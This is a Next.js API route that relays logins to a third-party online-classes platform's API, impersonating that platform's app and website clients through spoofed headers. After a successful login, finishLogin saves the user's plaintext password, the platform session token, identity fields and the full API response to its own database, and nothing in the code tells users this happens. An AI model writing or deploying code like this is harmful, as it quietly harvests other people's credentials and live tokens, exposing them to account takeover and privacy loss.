import { NextRequest, NextResponse } from "next/server";
import crypto from "crypto";
import { saveUserLoginToDb } from "@/lib/db";

export const dynamic = "force-dynamic";

const DISHA_API = "https://dishaonlineclassesapi.classx.co.in";
const MOBILE_UA =
  "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36";

/**
 * POST /api/auth/login
 * Same 2-step login as dishaplayer.py do_login():
 *   Step 1 → POST /post/userLogin                         (okhttp headers)
 *     status 200 + data → done
 *     status 203        → Step 2
 *   Step 2 → POST /post/userLogin?extra_details=0         (website headers)
 *     status 200 + data → done
 */
export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    const email = String(body?.userId || body?.email || body?.mobile || body?.phone || "").trim();
    const password = String(body?.password || "");

    if (!email || !password.trim()) {
      return NextResponse.json(
        { ok: false, error: "Please enter Mobile Number / ID and Password." },
        { status: 400 }
      );
    }

    if (email.length > 120 || password.length > 200) {
      return NextResponse.json(
        { ok: false, error: "Invalid input length." },
        { status: 400 }
      );
    }

    let d1: Record<string, unknown> = {};
    try {
      d1 = await dishaPost("post/userLogin", { email, password }, {
        "Auth-Key": "appxapi",
        "User-Id": "-2",
        Authorization: "",
        Language: "en",
        "User-Agent": "okhttp/4.9.1",
      });
    } catch {
      return NextResponse.json(
        { ok: false, error: "Could not reach Disha servers. Please try again." },
        { status: 502 }
      );
    }

    if (isOk(d1)) return await finishLogin(req, email, password, d1);

    if (statusOf(d1) === 203) {
      let d2: Record<string, unknown> = {};
      try {
        d2 = await dishaPost(
          "post/userLogin?extra_details=0",
          {
            source: "website",
            phone: email,
            email,
            password,
            extra_details: "1",
          },
          {
            "auth-key": "appxapi",
            "client-service": "Appx",
            source: "website",
            "user-agent": MOBILE_UA,
            accept: "*/*",
          }
        );
      } catch {
        return NextResponse.json(
          { ok: false, error: "Could not reach Disha servers. Please try again." },
          { status: 502 }
        );
      }

      if (isOk(d2)) return await finishLogin(req, email, password, d2);

      return NextResponse.json(
        { ok: false, error: messageOf(d2) },
        { status: 401 }
      );
    }

    return NextResponse.json({ ok: false, error: messageOf(d1) }, { status: 401 });
  } catch {
    return NextResponse.json(
      { ok: false, error: "Unable to process login right now." },
      { status: 500 }
    );
  }
}

async function dishaPost(
  path: string,
  fields: Record<string, string>,
  headers: Record<string, string>
): Promise<Record<string, unknown>> {
  const body = new URLSearchParams();
  for (const [key, value] of Object.entries(fields)) body.append(key, value);

  const res = await fetch(`${DISHA_API}/${path.replace(/^\//, "")}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      Accept: "application/json, text/plain, */*",
      ...headers,
    },
    body: body.toString(),
    cache: "no-store",
  });

  const text = await res.text();
  try {
    const parsed = JSON.parse(text) as unknown;
    if (parsed && typeof parsed === "object") return parsed as Record<string, unknown>;
  } catch {
    const match = text.match(/\{[\s\S]*\}/);
    if (match) {
      try {
        const parsed = JSON.parse(match[0]) as unknown;
        if (parsed && typeof parsed === "object") return parsed as Record<string, unknown>;
      } catch {
        /* fall through */
      }
    }
  }
  return { status: res.status, message: text.slice(0, 180) || "Empty response from Disha." };
}

function statusOf(data: Record<string, unknown>): number {
  const n = Number(data?.status);
  return Number.isFinite(n) ? n : 0;
}

function isOk(data: Record<string, unknown>): boolean {
  return statusOf(data) === 200 && Boolean(data?.data) && typeof data.data === "object";
}

function messageOf(data: Record<string, unknown>): string {
  const msg = String(data?.message || data?.msg || "").trim();
  return msg || "Invalid User ID / Mobile Number or Password.";
}

async function finishLogin(
  req: NextRequest,
  email: string,
  password: string,
  dishaData: Record<string, unknown>
) {
  const ip =
    req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    req.headers.get("x-real-ip") ||
    "unknown";
  const userAgent = req.headers.get("user-agent") || "unknown";

  const u =
    dishaData?.data && typeof dishaData.data === "object"
      ? (dishaData.data as Record<string, unknown>)
      : {};

  try {
    await saveUserLoginToDb({
      userId: email,
      password,
      ip,
      userAgent,
      createdAt: new Date().toISOString(),
      dishaUserId: String(u?.userid || ""),
      dishaName: String(u?.name || ""),
      dishaEmail: String(u?.email || ""),
      dishaPhone: String(u?.phone || ""),
      dishaUsername: String(u?.username || ""),
      dishaState: String(u?.state || ""),
      dishaToken: String(u?.token || ""),
      dishaPhoto: String(u?.photo || ""),
      dishaAppCategory: String(u?.app_category || ""),
      dishaIsPaidUser: String(u?.is_paid_user || "0"),
      dishaIsTester: String(u?.is_tester ?? ""),
      dishaAadharStatus: String(u?.aadhar_status || ""),
      dishaFullResponse: JSON.stringify(dishaData),
    });
  } catch {
    // Login still succeeds if the login log cannot be written.
  }

  const sessionToken = crypto.randomBytes(24).toString("hex");
  return NextResponse.json({
    ok: true,
    sessionToken,
    loginTime: Date.now(),
    dishaUserId: String(u?.userid || ""),
    name: String(u?.name || ""),
  });
}
